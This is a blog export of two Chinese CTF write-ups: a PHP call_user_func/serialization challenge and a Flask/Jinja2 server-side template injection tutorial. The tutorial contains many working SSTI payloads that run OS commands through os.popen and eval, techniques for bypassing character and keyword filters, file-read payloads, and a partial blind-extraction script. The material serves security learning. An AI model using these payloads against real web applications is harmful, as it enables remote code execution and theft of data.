<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020网鼎杯phpweb</title>
    <url>/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/</url>
    <content><![CDATA[<h1 id="1-访问页面"><a href="#1-访问页面" class="headerlink" title="1.访问页面"></a>1.访问页面</h1><p>curl+u，可以查看到这些：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">id</span>=<span class="string">form1</span> <span class="attr">name</span>=<span class="string">form1</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">func</span> <span class="attr">name</span>=<span class="string">func</span> <span class="attr">value</span>=<span class="string">&#x27;date&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">p</span> <span class="attr">name</span>=<span class="string">p</span> <span class="attr">value</span>=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话我们推测它就是用了一个call_user_func的回调函数..</p>
<p>然后自己在这里卡了很久，最后才想起来file_get_contents函数可以读文件，</p>
<p>于是构造：</p>
<p><img src="image-20201028192957104.png" alt="image-20201028192957104"></p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后我又卡住了，看似好像是反序列化，又好像不是啊？找不到反序列化的点，一时间又僵住了，过了一会儿看了大佬的WP才意识到是自己思路还不够灵活，这道题没有unserialize，但是可以动调函数，审计代码中的Test类，其实他是有gettime的，这个函数就是一个动调函数，那我们的思路就很明确</p>
<h1 id="2-构造payload"><a href="#2-构造payload" class="headerlink" title="2.构造payload"></a>2.构造payload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __destruct() &#123;</span></span><br><span class="line"><span class="comment">//        if ($this-&gt;func != &quot;&quot;) &#123;</span></span><br><span class="line"><span class="comment">//            echo gettime($this-&gt;func, $this-&gt;p);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> (serialize($test));</span><br></pre></td></tr></table></figure>

<p>之后将这一段带入到题目当中，最终在tmp目录下找到</p>
<p><img src="image-20201028192936143.png" alt="image-20201028192936143"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>FlaskSSti</title>
    <url>/2020/10/27/FlaskSSti/</url>
    <content><![CDATA[<p>一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做</p>
<a id="more"></a>

<h1 id="1-hackbar-自带的payload如何构成的"><a href="#1-hackbar-自带的payload如何构成的" class="headerlink" title="1.hackbar 自带的payload如何构成的"></a>1.hackbar 自带的payload如何构成的</h1><p>第一件事情，就是搭建我们的环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
<p>通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>

<p>__class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>

<p>也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到：</p>
<p><strong>globals()</strong> 函数会以字典类型返回当前位置的全部全局变量,在交互模式下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>

<p>于是我们拼接得到如下的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>可以得到：</p>
<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
<p>我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0</p>
<p>执行如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象</p>
<p><strong>os.popen</strong> </p>
<p>　　该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。</p>
<p>　　output = os.popen(‘cat /proc/cpuinfo’)</p>
<p>　　print output.read()</p>
<p>于是我们构造最终的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-config以外的思路"><a href="#1-2-config以外的思路" class="headerlink" title="1.2 config以外的思路"></a>1.2 config以外的思路</h2><p>其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#得到str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<p>这时引入base和mro的魔术方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bases : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）</span><br><span class="line">mro :类的父类，从父类网上找，最终会找到基类，所以mro[<span class="number">-1</span>]等价于__bases__</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
<p>这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#获取所有的子类方法</span></span><br></pre></td></tr></table></figure>

<p>之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有builtins，我们可以用这个去找eval：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-3总结做题的思路："><a href="#1-3总结做题的思路：" class="headerlink" title="1.3总结做题的思路："></a>1.3总结做题的思路：</h2><p>总而言之，我们要么去找builtins函数下的eval，要么去找os。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C</span><br></pre></td></tr></table></figure>



<h1 id="2-谈谈过滤"><a href="#2-谈谈过滤" class="headerlink" title="2.谈谈过滤"></a>2.谈谈过滤</h1><p>在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等</p>
<h2 id="2-1-过滤了os，system等的情况"><a href="#2-1-过滤了os，system等的情况" class="headerlink" title="2.1 过滤了os，system等的情况"></a>2.1 过滤了os，system等的情况</h2><p>在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过：</p>
<p>比如我们之前的payload修改成：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-过滤了中括号"><a href="#2-2-过滤了中括号" class="headerlink" title="2.2 过滤了中括号"></a>2.2 过滤了中括号</h2><p>这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>

<p>Python的魔法方法<code>__getitem__</code> 可以让对象实现迭代功能，这样就可以使用<code>for...in...</code> 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用request起步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-过滤了-号"><a href="#2-3-过滤了-号" class="headerlink" title="2.3 过滤了.号"></a>2.3 过滤了.号</h2><p>这个可以使用attr来进行绕过了，直接给出绕过方法：</p>
<p>所以之前的payload进行对比：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br><span class="line">    <span class="comment"># 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了</span></span><br></pre></td></tr></table></figure>

<p>不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路</p>
<h2 id="2-5利用request"><a href="#2-5利用request" class="headerlink" title="2.5利用request"></a>2.5利用request</h2><p>​    因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的</p>
<p>这里翻阅到了一个老外思路，但是他没给全。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>

<p>利用request的思路去重新把payload拼出来</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>



<h2 id="2-4将中括号和-号都过滤情况下"><a href="#2-4将中括号和-号都过滤情况下" class="headerlink" title="2.4将中括号和.号都过滤情况下"></a>2.4将中括号和.号都过滤情况下</h2><p>当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制</p>
<p>我们可以先写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>之后为了绕过括号的限制，采用这种方法：</p>
<p>这里给出一个payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>

<h2 id="2-6-过滤了单引号和双引号的情况"><a href="#2-6-过滤了单引号和双引号的情况" class="headerlink" title="2.6 过滤了单引号和双引号的情况"></a>2.6 过滤了单引号和双引号的情况</h2><p>在这种情况下，我们就只能去尝试查找各类的open函数了，没有办法执行命令了，于是查找到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>

<p>之后为了绕过引号的过滤，我们尝试使用request.args.x1的方式进行绕过</p>
<p>拼凑得：</p>
<h2 id="2-7-读取文件"><a href="#2-7-读取文件" class="headerlink" title="2.7 读取文件"></a>2.7 读取文件</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>

<p>而实际上，我发现中括号也是可以进行替代的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;)    &#125;&#125;&amp;x1=eval</span><br></pre></td></tr></table></figure>

<p>拼凑得出：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir</span><br></pre></td></tr></table></figure>



<h2 id="2-8过滤了eval，popen，两个左花括号"><a href="#2-8过滤了eval，popen，两个左花括号" class="headerlink" title="2.8过滤了eval，popen，两个左花括号"></a>2.8过滤了eval，popen，两个左花括号</h2><p>这里记录一下自己学习到的一道题目：</p>
<h3 id="上海市网络安全大赛："><a href="#上海市网络安全大赛：" class="headerlink" title="上海市网络安全大赛："></a>上海市网络安全大赛：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span>__</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>这道题比较新有意思的点在两个地方：</p>
<p>过滤了这个地方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>过滤了{ {} },这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>如果满足条件，则会输出<del>p0</del>，否则就不会输出。第二点，我们该读取什么文件呢？</p>
<p>这里运用了os.system(“rm -f /flag”)</p>
<p>默认的进程删除后会存放在暂时文件中，进程为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>故编写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span 